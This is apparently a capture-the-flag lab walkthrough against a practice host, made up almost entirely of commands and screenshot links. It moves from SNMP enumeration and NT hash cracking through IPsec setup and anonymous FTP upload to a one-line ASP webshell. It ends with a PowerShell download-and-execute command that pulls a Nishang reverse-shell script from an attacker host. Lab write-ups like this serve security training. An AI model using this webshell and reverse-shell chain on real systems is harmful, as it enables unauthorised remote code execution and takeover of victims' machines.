```
nmap -sU
snmpwalk
john
ipsec up conceal
ftp
webshell
reverse shell
```



```
nmap -sU 10.10.10.116
```
![image](https://user-images.githubusercontent.com/33616880/232364715-ff3ffc38-74c1-4413-bfc3-fcae12865969.png)



```
ike-scan 10.10.10.116
```
![image](https://user-images.githubusercontent.com/33616880/232364778-a4a13ea3-021b-4d83-8b00-c03c57b5a620.png)



```
snmpwalk -v2c -c public 10.10.10.116
```
![image](https://user-images.githubusercontent.com/33616880/232364814-465dd54b-fd4a-41e8-a43e-41c669b5d4cd.png)



```
john hash -w=/usr/share/wordlists/rockyou.txt --format=NT
```
![image](https://user-images.githubusercontent.com/33616880/232364875-518777e7-95f3-41ef-bfbe-53774db9d249.png)



```
apt install strongswan
```
![image](https://user-images.githubusercontent.com/33616880/232364935-4cbb7254-df0b-420b-a78d-6829d4000f61.png)
![image](https://user-images.githubusercontent.com/33616880/232364951-64aa1c8c-7ab1-46bb-aed3-7e50852792e5.png)
![image](https://user-images.githubusercontent.com/33616880/232364962-c98b750a-4e75-45f0-aca8-610f44cd4254.png)



```
ipsec up conceal
```
![image](https://user-images.githubusercontent.com/33616880/232365041-1bdb6e08-96cf-4bd8-bff2-0c379c88a5c8.png)



```
nmap -sT -p- 10.10.10.116
```
![image](https://user-images.githubusercontent.com/33616880/232365088-55b7420a-981a-49da-89f9-0a26f7f7fbdf.png)



![image](https://user-images.githubusercontent.com/33616880/232365141-15f38484-a572-42cd-88e0-94e3d5e6e527.png)



```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.116/FUZZ -fc 403 -e .aspx,.php,.txt,.html
![image](https://user-images.githubusercontent.com/33616880/232365179-3ae6cec7-5cc5-4768-8365-bfd5630c7cb4.png)
```
![image](https://user-images.githubusercontent.com/33616880/232365198-6ebb3b00-d084-45d0-a9f8-3dc461c794d0.png)



```
ftp 10.10.10.116 : anonymous
put test.txt
```
![image](https://user-images.githubusercontent.com/33616880/232365238-86c2e89e-90ad-46d2-83fe-6445f34f048d.png)
![image](https://user-images.githubusercontent.com/33616880/232365246-f42f2534-6a5c-45af-a10b-33db27d89131.png)



```
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```
```
http://10.10.10.116/upload/cmd.asp?cmd=whoami
```
![image](https://user-images.githubusercontent.com/33616880/232366101-57441e0d-fc94-4fbb-99d5-d55b856e0ad0.png)
![image](https://user-images.githubusercontent.com/33616880/232366110-7f6082bd-20b8-48b0-a5f1-dadc070b338f.png)
![image](https://user-images.githubusercontent.com/33616880/232366126-b3fc0a5b-6379-4593-9ff0-68a460f93c88.png)



```
git clone https://github.com/samratashok/nishang.git
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
Add payload a line to the end: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 4444
http://10.10.10.116/upload/cmd.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.7/Invoke-PowerShellTcp.ps1%27)
```
![image](https://user-images.githubusercontent.com/33616880/232365388-518308e7-efb2-4b48-adef-583573a84920.png)
![image](https://user-images.githubusercontent.com/33616880/232365400-966934e9-4409-414f-8ef7-41e86897b1b6.png)
![image](https://user-images.githubusercontent.com/33616880/232365409-b30bd056-5ec7-4a2b-9540-6f0eb3417dd7.png)



```
whoami /priv
```
![image](https://user-images.githubusercontent.com/33616880/232365422-2e537ec4-2461-4de6-b1ef-bb85995c0182.png)

